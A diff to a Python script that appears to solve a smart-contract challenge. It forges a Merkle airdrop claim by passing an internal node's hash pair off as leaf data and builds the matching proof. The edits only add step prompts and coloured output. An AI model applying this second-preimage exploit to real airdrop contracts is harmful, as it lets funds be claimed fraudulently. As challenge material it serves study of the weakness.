@@ -1,9 +1,10 @@
 import json
+from pathlib import Path
 from web3 import Web3
 
-tree = json.load(open("data/tree.json", "r"))
+tree = json.load(open(Path(__file__).parent / "data" / "tree.json", "r"))
 
-print("STEP 1 - Find all the unwanted valid data")
+print("\x1b[33mSTEP 1 - Find all the unwanted valid data\x1b[0m")
 
 unwanted_valid_data = []
 
@@ -24,9 +25,10 @@ for height in range(max_path_length):
              if keccak in hashes_by_height[height+1]:
                 unwanted_valid_data.append(h1 + h2[2:])
 
-print("%d unwanted valid data found." % len(unwanted_valid_data))
+print("  %d unwanted valid data found." % len(unwanted_valid_data))
+input("  Press any key to go to the next step.\n")
 
-print("STEP 2 - Find a data with a decent claim amount")
+print("\x1b[33mSTEP 2 - Find a data with a decent claim amount\x1b[0m")
 
 max_claim_amount = 75 * 10 ** 21
 claimable_unwanted_data = []
@@ -36,9 +38,10 @@ for data in unwanted_valid_data:
     if amount <= max_claim_amount:
         claimable_unwanted_data.append((data, amount))
 
-print("%d unwanted claimable data found." % len(claimable_unwanted_data))
+print("  %d unwanted claimable data found." % len(claimable_unwanted_data))
+input("  Press any key to go to the next step.\n")
 
-print("STEP 3 - Find an user that can claim the remaining amount")
+print("\x1b[33mSTEP 3 - Find an user that can claim the remaining amount\x1b[0m")
 
 remaining_amount = max_claim_amount - claimable_unwanted_data[0][1]
 
@@ -47,10 +50,12 @@ for address in tree["claims"]:
         user_claim = tree["claims"][address]
         user_claim["account"] = address
         user_claim["amount"] = int(user_claim["amount"], 16)
-        print("An user can claim the remaining amount.")
+        print("  An user can claim the remaining amount.")
         break
 
-print("STEP 4 - Build the solution")
+input("  Press any key to go to the next step.\n")
+
+print("\x1b[33mSTEP 4 - Build the solution\x1b[0m")
 
 def get_proof(data):
     hash = Web3.soliditySha3(['bytes32'], [data]).hex()
@@ -76,5 +81,5 @@ unwanted_claim = {
     "proof": get_proof(claimable_unwanted_data[0][0])
 }
 
-print("Unwanted claim: " + str(json.dumps(unwanted_claim, indent=4, sort_keys=True)))
-print("User claim: " + str(json.dumps(user_claim, indent=4, sort_keys=True)))
+print("  Unwanted claim: " + str(json.dumps(unwanted_claim, indent=4, sort_keys=True)))
+print("  User claim: " + str(json.dumps(user_claim, indent=4, sort_keys=True)))
